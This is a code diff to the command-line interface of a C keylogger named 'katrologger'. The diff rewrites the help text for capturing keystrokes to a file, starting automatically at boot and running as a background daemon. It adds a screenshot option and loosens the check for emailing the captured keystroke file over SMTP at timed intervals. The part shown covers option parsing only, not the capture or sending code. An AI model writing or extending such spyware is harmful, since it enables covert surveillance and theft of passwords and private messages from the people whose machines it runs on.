@@ -9,23 +9,24 @@ int no_daemon = 0;
 
 void usage() {
     printf("Parameters:\n");
-    printf("\t-o, --output       file path\n");
-    printf("\t-k, --kill         stop\n");
-    printf("\t-s, --status       status\n");
+    printf("\t-o, --output       key capture file\n");
+    printf("\t-k, --kill         stop keylogger\n");
+    printf("\t-s, --status       status service\n");
     printf("\t--no-bootable      disable automatic startup\n");
     printf("\t--no-daemon        no background process will be created\n");
     printf("\t-h, --help         help\n");
 
     printf("\nSend Mail (libquickmail):\n");
-    printf("\t--smtp-status      email status\n");
+    printf("\t--smtp-status      status of sending email service\n");
     printf("\t--smtp-url         SMTP server\n");
     printf("\t--smtps-url        SMTPS server\n");
     printf("\t--port             SMTP port\n");
     printf("\t--mail-from        source email\n");
     printf("\t--pass             password email\n");
     printf("\t--mail-rcpt        receipt email\n");
-    printf("\t--smtp-file        key log file attachment\n");
-    printf("\t--time             time intervall, --time 1-60 (minutes)\n");
+    printf("\t--smtp-file        attach key capture file for sending\n");
+    printf("\t--time             time interval for sending, ex: --time 1-60 (minutes)\n");
+    printf("\t--screen           screenshot, ex: --screen :0 (display)\n");
 
     printf("\nUsage:\n\tkatrologger --output /var/log/<file>\n");
     exit(0);
@@ -51,19 +52,21 @@ struct option long_options[] = {
   {"pass", required_argument,      0,  0 },
   {"smtp-file", required_argument, 0,  0 },
   {"time", required_argument,      0,  0 },
+  {"screen", no_argument,          0,  4 },
   {0, 0, 0, 0}
 };
 
 if (argc < 2)
   usage();
 
-while((opt = getopt_long(argc, argv, "hkso:01", long_options, NULL)) != -1) {
+while((opt = getopt_long(argc, argv, "hkso:014", long_options, NULL)) != -1) {
   switch (opt) {
+    case 4:
     case 0:
-        if (argc == 15) {
+        if (argc >= 15) {
           flag_smtp = 1;
         } else {
-          printf("[x] Required arguments for send mail ...\n"); exit(1);
+          printf("[x] Required arguments for send mail\n"); exit(1);
         }
       break;
     case 1:
